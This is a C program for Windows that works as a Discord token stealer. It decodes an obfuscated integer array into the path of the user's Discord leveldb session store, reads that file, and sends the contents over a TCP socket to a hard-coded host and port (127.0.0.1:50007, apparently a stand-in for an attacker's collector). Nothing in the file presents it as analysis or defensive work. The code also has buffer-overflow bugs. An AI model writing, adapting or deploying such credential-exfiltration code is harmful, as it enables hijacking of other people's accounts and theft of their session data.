#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#define helpme "127.0.0.1"
#define godpls 50007
#define myname 32
char put[50];
char gib_st(int a_number)
{
    int key = 300;
    int p1 = 100;
    int p2 = 10;
    int final = a_number - p1 - key + p2;
    char charbro[1];
    sprintf(charbro, "%c", final);
    strncat(put,charbro,1);
    return 0;
}
int main()
{
    TCHAR meisbuf[myname];
    DWORD mycrazylen = sizeof(meisbuf);
    GetUserName(meisbuf, &mycrazylen);
    int somethingidontremember[10] = {457, 448, 482, 482, 475, 505, 491, 504, 505, 482};
    int othersomethingidontremember[57] = {482, 455, 502, 502, 458, 487, 506, 487, 482, 472, 501, 487, 499, 495, 500, 493, 482, 490, 495, 505, 489, 501, 504, 490, 482, 466, 501, 489, 487, 498, 422, 473, 506, 501, 504, 487, 493, 491, 482, 498, 491, 508, 491, 498, 490, 488, 482, 438, 438, 438, 438, 438, 443, 436, 498, 490, 488};
    for(int i = 0;i != 10;i = i + 1)
    {
        gib_st(somethingidontremember[i]);
    }
    strncat(put,meisbuf,sizeof(meisbuf)/4);
    for(int i = 0; i != 57;i = i + 1)
    {
        gib_st(othersomethingidontremember[i]);
    }
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET tismagic;
    tismagic = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in callitaday;
    callitaday.sin_family = AF_INET;
    callitaday.sin_addr.s_addr = inet_addr(helpme);
    callitaday.sin_port = htons(godpls);
    connect(tismagic, (SOCKADDR *) & callitaday, sizeof (callitaday));
    FILE *file;
    file = fopen(put, "rb");
    int ch;
    char yes[1];
    char jeeeez[50000];
    while ((ch = fgetc(file)) != EOF)
    {
        sprintf(yes, "%c", ch);
        strncat(jeeeez,yes,1);
    }
    fclose(file);
    send(tismagic,jeeeez,strlen(jeeeez),0);
    closesocket(tismagic);
    return 0;
}
